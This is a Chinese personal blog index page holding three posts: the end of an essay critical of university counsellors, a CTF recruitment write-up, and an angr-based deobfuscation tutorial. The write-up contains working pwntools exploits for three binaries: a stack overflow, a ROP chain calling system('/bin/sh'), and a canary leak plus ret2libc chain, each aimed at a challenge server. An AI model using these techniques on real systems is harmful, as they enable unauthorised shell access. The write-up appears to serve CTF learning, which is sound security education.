辅导员的话<strong>不能信</strong>，他们告诉你的人生经验有很大一部分是利益权衡之后的结果，”想要出人头地<strong>就去</strong>考研”、”成绩好的<strong>都</strong>出国了”、”这个比赛含金量非常高”，潜台词就是用你的付出去为学院赚业绩，提升自我这些东西只是借口罢了，他们没有读过我们专业，他们自己也不懂软件专业应当达到的要求，他们眼中学院要求的事情就是成功的法宝。<br>​        我们真正应该做的，是去多接触业界大佬，多与老师交流，用他们的见识来为自己的未来铺路。多做项目，多加入老师的实验室，而不是去得那个看起来光鲜实则那啥的奖学金。<br>​        很多时候，辅导员永远是一个学校用于背锅的存在，他们既承受着来自于学校的压力，又要忍受来自于学生的不满。辅导员的所作所为，其实和学校的处事方式也是有高度关系的。<br>​        我梦想着，我的母校，有一天能够务实作风，发挥他作为一个信息技术专精之高校的优势，赶超国外高校，眼看着李言荣校长让我们学校的学风焕然一新，眼看着我们学校的收分从10000名升到了2400名，可是他却离任了。<br>​        最后，那个梦想，永远只能是个梦想啊。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/7c773b71/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/7c773b71/" class="post-title-link" itemprop="url">CNSS-PWN招新三部曲</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2019-09-14 11:10:15 / Modified: 12:02:14" itemprop="dateCreated datePublished" datetime="2019-09-14T11:10:15+08:00">2019-09-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-up/" itemprop="url" rel="index">
                    <span itemprop="name">write up</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-up/cnss-recruit-201809/" itemprop="url" rel="index">
                    <span itemprop="name">cnss_recruit_201809</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CNSS-PWN"><a href="#CNSS-PWN" class="headerlink" title="CNSS-PWN"></a>CNSS-PWN</h1><p> <a href="\uploads\GuessPigeon.7z">GuessPigeon.7z</a> </p>
<h2 id="GuessPigeon"><a href="#GuessPigeon" class="headerlink" title="GuessPigeon"></a>GuessPigeon</h2><h3 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">guess</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"My Gooood!You guessed the pigeon number!!"</span>);</span><br><span class="line">    getshell();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You are wrong!The pigeon's number is %d\n try again~"</span>, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见 scanf处没有限制字符串长度大小，可以通过该处进行栈溢出</p>
<p>a1是调用guess函数时传入的参数，存在栈里面</p>
<p>nptr为输入的字符串，也存在栈里面</p>
<p>可知进行栈溢出可以将a1和nptr覆盖成一样的形式，从而getshell</p>
<p>虽然这道题有canary，但是并没有起到作用</p>
<blockquote>
<p>char nptr; // [esp+8h] [ebp-70h]</p>
<p>题外话：关于padding的长度，<strong>一定要用gdb调试后算出来！！</strong></p>
<p>用ida眼睛看的十有八九都是错的！！</p>
</blockquote>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"132.232.34.26"</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">"GuessPigeon"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'123'</span> + <span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x74</span></span><br><span class="line">payload += p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="GuessPigeon2"><a href="#GuessPigeon2" class="headerlink" title="GuessPigeon2"></a>GuessPigeon2</h2><h3 id="analyze-1"><a href="#analyze-1" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to get hint? yes/no?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;buf, <span class="string">"yes"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">"Do you know \"%s\"\n"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次的ELF文件是64位的，传参方式为寄存器传参，这意味着我们需要用到ROP链来构造一段代码把参数传到寄存器里面去</p>
<h4 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary GuessPigeon2 --only <span class="string">'pop|ret'</span> | grep <span class="string">'rdi'</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>0x0000000000400933 : pop rdi ; ret</p>
</blockquote>
<h4 id="binsh"><a href="#binsh" class="headerlink" title="binsh"></a>binsh</h4><p>同时 字符串s刚好指向了 /bin/sh，利用system(s)可以getshell</p>
<p>查询了一下，system函数刚好存在于elf文件中，直接引用即可</p>
<blockquote>
<p>0x400650</p>
</blockquote>
<p>程序执行完guess之后，会跳到pop_rdi_ret的函数处，将rdi赋值为s的地址，接着调用system()，从而getshell</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon2')</span></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400933</span></span><br><span class="line">system_addr = <span class="number">0x400650</span></span><br><span class="line">binsh_addr = <span class="number">0x600E20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x78</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your guess:"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to get hint? yes/no?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="GuessPigeon3"><a href="#GuessPigeon3" class="headerlink" title="GuessPigeon3"></a>GuessPigeon3</h2><h3 id="analyze-2"><a href="#analyze-2" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You You have two chances. Please input your guess:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You guessed the pigeon number is %s .\nI'm sorry, you guessed wrong."</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess again:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们checksec一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">'/home/mrh929/Desktop/cnss/GuessPigeon3/GuessPigeon3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>程序开启了Canary和栈不可执行，guess函数中有两个read函数，即有两个溢出点</p>
<p>第一个溢出点的后面紧跟着一个printf，推测可能是用来泄露canary用的</p>
<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
<p><strong>canary</strong>是一种防止栈溢出的方式，通过在执行函数之前生成一个随机的canary，可以防止在函数结束之前有人通过read, scanf等不安全的函数进行栈溢出攻击，程序结束时会<strong>stack_check_fail</strong>，一旦canary被改变，程序将会马上退出</p>
<p><strong>canary</strong>的特点是最低位为0, eg: 0x49d8c100 ，本意是将printf截断，我们在用padding填充的时候可以sendline，即在最后一位填上一个’\n’，就可以做到将canary输出，当然最后要记得canary = out - ‘a’</p>
<h4 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h4><p>程序中没有给出system函数和/bin/sh字符串</p>
<p>但是给了一个libc文件，libc文件是一个动态链接库，程序通过读取这个动态链接库来执行它想要的函数</p>
<p>当然这个动态链接库的地址就<strong>不是固定的了</strong>，虽然我们静态分析的时候会得到一个<strong>静态的地址</strong>，但这个并不是动态链接库的最终地址，我们需要将程序运行之后某个libc函数的地址泄露出来，算出它与libc中的静态地址的偏移，从而得到libc中每个函数的真实地址</p>
<h4 id="plt-got"><a href="#plt-got" class="headerlink" title="plt got"></a>plt got</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table</a></p>
<p>plt的本质上是一个指向got表的指针，系统调用函数的时候会首先jmp plt，由plt进行push ，再jmp的操作，最终读取到got表，将eip指向函数的真实地址。</p>
<p>这个生成got表的动作是<strong>动态</strong>的，所以在我们没有调用某个函数时这个函数的got表将<strong>不存有任何地址信息</strong>。我们想要得到某个libc函数的真实地址，最好的方法是找准一个已经被系统执行的函数，查询它的got表，从而得到这个函数的真实地址。</p>
<p>这道题中puts和read函数都是被程序执行过的，我们随意选取一个函数</p>
<p>用  <strong>elf.got[‘puts’]</strong> 调出got表地址，利用write<strong>（三个参数）</strong>或者puts<strong>（一个参数）</strong>函数将其输出</p>
<p>相当于把guess函数的返回地址设置为write/puts</p>
<blockquote>
<p>注意，这里调用write/puts函数的本质也是调用plt表，在汇编层面其实等价于jmp addr</p>
<p>而这些函数都是需要ret/ leave 的，所以相应的我们应当在 write_plt 后面<strong>先加入一个 ret_addr</strong> ，再push 参数</p>
</blockquote>
<h4 id="after-that"><a href="#after-that" class="headerlink" title="after that"></a>after that</h4><p>同样的，注意canary 和 write_plt之间也有12个字节的padding，我第一次做这题的时候也是在padding上面卡了很久，一定要用gdb仔细调试才能得出padding长度！！</p>
<p>ret_addr可以设置为guess，因为guess函数有两个溢出点，可以继续栈溢出</p>
<p>在我们得到read的真实地址之后，我们就可以通过</p>
<p><strong>read_addr - libc.symbols[‘read’]</strong> </p>
<p>来得出偏移offset了，现在我们就可以知道任何一个函数的真实地址了</p>
<p>再执行一遍guess，同样的要获取canary并且构造payload。</p>
<p>最后压入/bin/sh参数，执行system()</p>
<h4 id="little-trick"><a href="#little-trick" class="headerlink" title="little trick"></a>little trick</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">pwnlib.gdb.attach(process)</span><br></pre></td></tr></table></figure>

<p>可以对pwntools的过程进行调试</p>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon3')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GuessPigeon3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = elf.symbols[<span class="string">'guess'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> *<span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#get canary value</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">100</span> + p32(canary) + <span class="string">'b'</span>* <span class="number">12</span></span><br><span class="line">payload2 += p32(puts_plt) + p32(ret_addr) + p32(write_got)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your guess again:"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Good bye~\n'</span>)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_read_addr = "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return to guess()</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'c'</span> * <span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(payload3)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#another canary</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary' = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">offset = write_addr - libc_write <span class="comment">#offset between real_addr and libc_addr</span></span><br><span class="line">system_addr = offset + libc_system</span><br><span class="line">binsh_addr = offset + libc_binsh</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'d'</span>*<span class="number">100</span> + p32(canary)</span><br><span class="line">payload4 += <span class="string">'b'</span>*<span class="number">12</span></span><br><span class="line">payload4 += p32(system_addr) + p32(ret_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'again:'</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/77b618a/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/77b618a/" class="post-title-link" itemprop="url">deflat</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2019-09-08 23:22:00 / Modified: 23:55:32" itemprop="dateCreated datePublished" datetime="2019-09-08T23:22:00+08:00">2019-09-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tips/" itemprop="url" rel="index">
                    <span itemprop="name">Tips</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="deflat"><a href="#deflat" class="headerlink" title="deflat"></a>deflat</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>前面谈到了利用<strong>ollvm</strong>可以对控制流进行混淆、平坦化，有正向必有逆向，有人利用angr模块写出了一个将混乱的控制流进行恢复，转化为可读的正常程序的脚本</p>
<h2 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h2><h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>angr是一个python模块，需要通过pip安装，然而安装时有可能会破坏原有其他模块的环境，所以angr官方文档提出应当使用虚拟python环境来安装angr。</p>
<p>亲测直接pip install anagr是不起作用的</p>
<p>官方文档可参考：<a href="https://docs.angr.io/introductory-errata/install" target="_blank" rel="noopener">https://docs.angr.io/introductory-errata/install</a></p>
<p><strong>安装步骤</strong></p>
<p>安装virtualenvwrapper</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure>

<p>构建虚拟环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; pip install angr</span><br></pre></td></tr></table></figure>

<p>如果系统提示mkvirtualenv : command not found， 参考如下这篇文章进行修复</p>
<p><a href="https://blog.csdn.net/qq_44090577/article/details/90756207" target="_blank" rel="noopener">https://blog.csdn.net/qq_44090577/article/details/90756207</a></p>
<p>安装好之后，就可以开始正常运行脚本了</p>
<h3 id="deflat-py"><a href="#deflat-py" class="headerlink" title="deflat.py"></a>deflat.py</h3><p>clone deflat的相关脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mrh929/deflat</span><br></pre></td></tr></table></figure>

<h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><h3 id="deflat-1"><a href="#deflat-1" class="headerlink" title="deflat"></a>deflat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 deflat.py [file_name] [start_addr]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>0x400660 是函数</code>main()`的地址。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr) root@ubuntu:~/Desktop/deflat/test# python3 deflat.py esay_obfuscation 0x400660</span><br><span class="line">*******************relevant blocks************************</span><br><span class="line">prologue: 0x400660</span><br><span class="line">main_dispatcher: 0x40072a</span><br><span class="line">pre_dispatcher: 0x400926</span><br><span class="line">retn: 0x40091a</span><br><span class="line">relevant_blocks: ['0x4008a3', '0x4008b8', '0x400855', '0x40083d', '0x400868', '0x400909', '0x400820', '0x4008f8', '0x400881', '0x400816']</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">-------------------dse 0x4008a3---------------------</span><br><span class="line">-------------------dse 0x4008b8---------------------</span><br><span class="line">CRITICAL | 2019-09-08 08:46:50,813 | angr.sim_state | The name state.se is deprecated; please use state.solver.</span><br><span class="line">-------------------dse 0x400855---------------------</span><br><span class="line">-------------------dse 0x40083d---------------------</span><br><span class="line">-------------------dse 0x400868---------------------</span><br><span class="line">-------------------dse 0x400909---------------------</span><br><span class="line">-------------------dse 0x400820---------------------</span><br><span class="line">-------------------dse 0x4008f8---------------------</span><br><span class="line">-------------------dse 0x400881---------------------</span><br><span class="line">-------------------dse 0x400816---------------------</span><br><span class="line">-------------------dse 0x400660---------------------</span><br><span class="line">************************flow******************************</span><br><span class="line">0x4008a3:  ['0x400868']</span><br><span class="line">0x4008b8:  ['0x4008f8', '0x400909']</span><br><span class="line">0x400855:  ['0x400868']</span><br><span class="line">0x40083d:  ['0x40091a']</span><br><span class="line">0x400868:  ['0x400881', '0x4008b8']</span><br><span class="line">0x400909:  ['0x40091a']</span><br><span class="line">0x400820:  ['0x40083d', '0x400855']</span><br><span class="line">0x4008f8:  ['0x40091a']</span><br><span class="line">0x400881:  ['0x4008a3']</span><br><span class="line">0x400816:  ['0x4008a3']</span><br><span class="line">0x400660:  ['0x400820']</span><br><span class="line">0x40091a:  []</span><br><span class="line">************************patch*****************************</span><br><span class="line">Successful! The recovered file: esay_obfuscation_recovered</span><br></pre></td></tr></table></figure>

<p><strong>原二进制文件（no flat）</strong></p>
<p><img src="https://i.loli.net/2019/09/08/kFiOs7ApN4U92wx.png" alt="image.png"></p>
<p><strong>deflat 后的二进制文件</strong></p>
<p><img src="https://i.loli.net/2019/09/08/hfv3K75Jpl1YtmX.png" alt="image.png"></p>
<blockquote>
<p>两者几乎相同</p>
</blockquote>
<h3 id="deBogus"><a href="#deBogus" class="headerlink" title="deBogus"></a>deBogus</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>利用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架去除虚假的控制流，详细内容请参考<a href="https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html" target="_blank" rel="noopener">Deobfuscation: recovering an OLLVM-protected program</a> 。</p>
<p>原文的主要思路是在进行符号执行时，对约束条件进行”精简”，通过将<code>x * (x + 1) % 2</code>替换为<code>0</code>，使得<code>(y &lt; 10 || x * (x + 1) % 2 == 0)</code>恒成立，从而获取正确的基本块，避免死循环。</p>
<p>在使用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架解决该问题时，也可以按照上述思路进行。另外一种思路是直接将<code>x</code>或<code>y</code>的值设为<code>0</code>，同样可以使得上面的约束恒成立。在默认条件下，<code>x</code>和<code>y</code>的值会被初始化为0，无需手动进行设置。也就是说，可以直接利用符号执行来解决，而不会遇到死循环的问题。</p>
<p>通过符号执行，获取所有执行过的基本块之后，再进行<code>patch</code>去除冗余的基本块即可。</p>
<blockquote>
<p>对控制流进行精简后，通过<code>F5</code>查看伪代码，与源码基本一致。另外，可以在此基础上对控制流进行进一步精简，比如去除冗余的指令等。</p>
</blockquote>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><blockquote>
<p><code>0x080483e0</code>是函数<code>target_function()</code>的地址。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr-dev) &lt;path&gt;/deflat/bogus_control_flow$ python3 debogus.py ./target_bogus 0x80483e0</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">executed blocks:  ['0x8048686', '0x804868b', '0x8048991', '0x8048592', '0x8048914', '0x8048715', '0x8048897', '0x8048720', '0x8048725', '0x80484ab', '0x804862c', '0x804842e', '0x80484b6', '0x80484bb', '0x80487bb', '0x80487c0', '0x80486c7', '0x8048950', '0x8048551', '0x80488d3', '0x8048955', '0x8048556', '0x8048856', '0x80489d8', '0x80488d8', '0x804885b', '0x80483e0', '0x80485e0', '0x8048761', '0x80485eb', '0x80485f0', '0x80484f7', '0x80487fc']</span><br><span class="line">************************patch******************************</span><br><span class="line">Successful! The recovered file: ./target_bogus_recovered</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">mrh929</p>
  <div class="site-description" itemprop="description">Blog</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/posts">
          <span class="site-state-item-count">79</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
